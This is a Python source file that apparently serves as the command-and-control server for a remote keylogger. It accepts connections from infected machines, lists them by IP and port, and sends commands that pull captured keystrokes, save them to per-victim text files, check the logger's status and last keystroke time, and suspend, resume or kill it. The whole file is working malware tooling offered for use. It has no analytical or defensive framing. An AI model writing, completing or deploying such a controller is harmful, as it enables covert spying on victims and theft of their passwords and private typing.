import socket
import threading
import time
import struct
import sys

Client_List=[]
Normal_Help='''
Command         Description
-------         -----------
list            To List Number of Clients
select <id>     To Select a client
quit            To Exit
help            Show this Message
'''

C_Help='''
Command         Description
-------         -----------
dump            Get keystrokes of Remote PC
dumpfile        Get Keystrokes and save it into file
status          Keylogger Status
stop            Suspend Keylogger running inside Remote PC
resume          Resume suspended keylogger inside Remote PC
kill            Shutdown Keylogger running inside Remote PC
back            Return to main Command Prompt
time            Last KeyStroke time
help            Show this Message
'''

def Save_File(name,ext,data):
    name=name+ext
    try:
        file=open(name,"ab")
        file.write(data)
        file.close()
        print("[+]Data is Saved into %s"%name)
    except BlockingIOError as Err:
        print(str(Err))    

    



def Process_Command(command):
    if(command=="list"):
        if(len(Client_List)==0):
            print("[!]No Client")
            return
        print("id\t\tIp\t\t\tport")
        print("--\t\t--\t\t\t----")        
        for i in enumerate(Client_List):
            cllst=i[1]
            print("%d\t\t%s\t\t%d"%(i[0],cllst[1][0],cllst[1][1]))
    
    
    if(command=="quit"):
        for i in Client_List:
            i[0].close()
        Server_Socket.close()    
        exit(0)
    
    if(command=='help'):
        print(Normal_Help)
    
    if("select " in command):
        try:
            index=command.index(' ')
            nid=int(command[index+1:])
            Csock=Client_List[nid][0]
            Text=str(Client_List[nid][1][0])+"@"+str(Client_List[nid][1][1])
        except ValueError as Err:
            print(str(Err));del Err;return
        except IndexError as Err:
            print(str(Err));del Err;return

        while 1:
            Inp=input(Text+"#")
            if(Inp=="back"):
                return
            if(-1==Process_Client_Command(Inp,Csock,nid)):
                return




def Process_Client_Command(command,CSock,Id):
    CSock.settimeout(60.0)
    if(command=="dump") or (command=="dumpfile"):
        try:
            I=int(1)
            CSock.send(struct.pack("=L",I))
            Total=CSock.recv(4)
            Total=struct.unpack_from("=L",Total,0)[0]
            if(Total==0):
                print("[!]No Data Available");return
            else:
                print("[!]Length: ",Total)
                while (Total> 0):
                    data=CSock.recv(Total)
                    print(str(data,encoding="ascii"))
                    Total-=len(data)
                    if(command=="dumpfile"):
                        filename=str(Client_List[Id][1][0])+'_'+str(Client_List[Id][1][1])
                        Save_File(filename,".txt",data)


        except ConnectionResetError as Err:
            CSock.close();del Client_List[Id];print(str(Err));return -1
        except ConnectionAbortedError as Err:  
            CSock.close();del Client_List[Id];print(str(Err));return -1
        except ConnectionError as Err:
            CSock.close();del Client_List[Id];print(str(Err));return -1
        except socket.timeout as Err:
            print(str(Err));return     
        except:
            print("[-]Something Wrong");return            
    
    if(command=="time"):
        try:
            I=int(2)
            CSock.send(struct.pack("=L",I))
            data=CSock.recv(8)
            if(len(data)==4):
                Time=struct.unpack_from("=L",data,0)
            else:
                Time=struct.unpack_from("=Q",data,0)
            if(Time[0]==0):
                print("[!]No key Has been pressed")
                return

            print("[+]Last KeyStroke: ",time.ctime(Time[0]))
            del Time

        except ConnectionResetError as Err:
            CSock.close();del Client_List[Id];print(str(Err));return -1
        except ConnectionAbortedError as Err:  
            CSock.close();del Client_List[Id];print(str(Err));return -1
        except ConnectionError as Err:
            CSock.close();del Client_List[Id];print(str(Err));return -1
        except socket.timeout as Err:
            print(str(Err));return    
        except:
            print("[-]Something Wrong");return    
    
    if(command=="status"):
        try:
            I=int(3)
            CSock.send(struct.pack("=L",I))
            data=CSock.recv(1)
            if(struct.unpack_from("=B",data)[0]==1):
                print("[+]Keylogger is active")
            else:
                print("[-]Keylogger is inactive")
        except ConnectionResetError as Err:
            CSock.close();del Client_List[Id];print(str(Err));return -1
        except ConnectionAbortedError as Err:  
            CSock.close();del Client_List[Id];print(str(Err));return -1
        except ConnectionError as Err:
            CSock.close();del Client_List[Id];print(str(Err));return -1
        except socket.timeout as Err:
            print(str(Err));return    
        except:
            print("[-]Something Wrong");return

    if(command=="stop"):
        try:
            I=int(4)
            CSock.send(struct.pack("=L",I))
        except ConnectionResetError as Err:
            CSock.close();del Client_List[Id];print(str(Err));return -1
        except ConnectionAbortedError as Err:  
            CSock.close();del Client_List[Id];print(str(Err));return -1
        except ConnectionError as Err:
            CSock.close();del Client_List[Id];print(str(Err));return -1
        except socket.timeout as Err:
            print(str(Err));return    
        except:
            print("[-]Something Wrong");return

    if(command=="resume"):
        try:
            I=int(5)
            CSock.send(struct.pack("=L",I))
        except ConnectionResetError as Err:
            CSock.close();del Client_List[Id];print(str(Err));return -1
        except ConnectionAbortedError as Err:  
            CSock.close();del Client_List[Id];print(str(Err));return -1
        except ConnectionError as Err:
            CSock.close();del Client_List[Id];print(str(Err));return -1
        except socket.timeout as Err:
            print(str(Err));return    
        except:
            print("[-]Something Wrong");return

    if(command=="kill"):
        I=int(6)
        CSock.send(struct.pack("=L",I))
        CSock.close();del Client_List[Id];return -1

    if(command=="help"):
        print(C_Help)
                                                           



      
            

def Wait_For_Clinet():
    while 1:
        try:
            Client_info=Server_Socket.accept()
            Client_List.append(Client_info)
            print("[+]New Connection :",Client_info[1])
        except:
            print("[-]Failed To Accept Socket");break
    return            

if(len(sys.argv)!=2):
    print("[!]Please Supply Port Number")
    sys.exit(0)

try:
    Port=int(sys.argv[1])
except ValueError as Err:
    print("[-]Failed To Convert : ",str(Err)) ;del Err
    sys.exit(1)   

try:
    Server_Socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.IPPROTO_TCP)
    Server_Socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    Server_Socket.bind(("0.0.0.0",Port))
    Server_Socket.listen(4)
except:
    print("[-]Somthing Happend During Socket Creation");sys.exit(0)    

thread=threading.Thread(target=Wait_For_Clinet)
thread.daemon=True
thread.start()

while(1):
    try:
        Inp=input("localhost@Handler$")
        Process_Command(Inp)
    except KeyboardInterrupt as Err:
        for i in Client_List:
            i[0].close()
        print("[!]KeyBoard Interuption Detected")
        Server_Socket.close()
        sys.exit(0)       
    